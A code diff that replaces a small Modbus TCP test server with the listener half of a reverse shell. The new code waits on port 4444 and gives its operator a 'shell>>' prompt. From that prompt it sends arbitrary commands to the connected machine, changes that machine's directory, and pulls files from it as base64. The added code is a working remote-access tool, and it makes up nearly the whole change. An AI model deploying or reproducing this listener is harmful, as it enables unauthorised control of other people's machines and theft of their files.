@@ -1,70 +1,55 @@
 import socket
-import struct
-import time
-import random
-
-ADDRESS = "0.0.0.0"
-PORT = 502
-
-# Buat socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-sock.bind((ADDRESS, PORT))
-sock.listen(5)
-
-print(f"Modbus TCP server started at {ADDRESS}:{PORT}")
-
-clients = []
-channels = [0] * 8
-last_update = 0
-
-while True:
-    # Terima koneksi baru
-    try:
-        sock.settimeout(0.2)
-        conn, addr = sock.accept()
-        clients.append(conn)
-        # print(f"Client connected: {addr}")
-    except socket.timeout:
-        pass
-
-    # Baca data dari client
-    for conn in clients[:]:
-        try:
-            conn.settimeout(0.01)
-            data = conn.recv(1024)
-            if not data:
-                clients.remove(conn)
-                conn.close()
+import json
+import base64
+class Listener:
+    def __init__(self, port):
+        con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        con.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+        con.bind(("0.0.0.0", port))
+        con.listen(1)
+        print("[**] waiting for connection")
+        self.connection, addres = con.accept()
+        print("[++] we have connection")
+    def safe_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode())
+    def safe_receive(self):
+        json_data = b""
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
                 continue
-
-            # Ambil header Modbus
-            transaction_id = data[0:2]
-            protocol_id = data[2:4]
-            unit_id = data[6:7]
-            function_code = data[7:8]
-
-            # Function code 3 = Read Holding Registers
-            if function_code == b'\x03':
-                byte_count = len(channels) * 2
-                payload = struct.pack("B", byte_count)
-                for val in channels:
-                    payload += struct.pack(">H", val)
-
-                pdu = function_code + payload
-                mbap = transaction_id + protocol_id + struct.pack(">H", len(pdu) + 1) + unit_id
-                conn.sendall(mbap + pdu)
-
-        except socket.timeout:
-            pass
-        except Exception:
-            clients.remove(conn)
-            conn.close()
-
-    # Update nilai setiap 1 detik
-    if int(time.time()) != last_update:
-        for i in range(8):
-            channels[i] = random.randint(13107, 65535)
-
-        print(time.strftime("%H:%M:%S") + " → " + ", ".join([f"Ch{i}={v}" for i, v in enumerate(channels)]))
-        last_update = int(time.time())
+    def excute_commands(self,data):
+        self.safe_send(data)
+        return self.safe_receive()
+    def exiting(self, data):
+        self.safe_send(data)
+        self.connection.close()
+        
+    def change_path(self, data):
+        self.safe_send(data)
+        return self.safe_receive()
+    def downloading(self, data,content):
+        with open(data, "wb") as file:
+            file.write(base64.b64decode(content))
+    def run(self):
+        while True:
+            command = input("shell>> ")
+            if command == "exit":
+                command_result = self.exiting(command)
+                break
+            elif command.startswith("cd "):
+                command_result = self.change_path(command)
+            elif command.startswith("download "):
+                self.safe_send(command)
+                content = self.safe_receive()
+                self.downloading(command[9:], content)
+                continue
+            else:
+                command_result = self.excute_commands(command)
+            print(command_result)
+sido = Listener(4444)
+sido.run()
+# my porject 
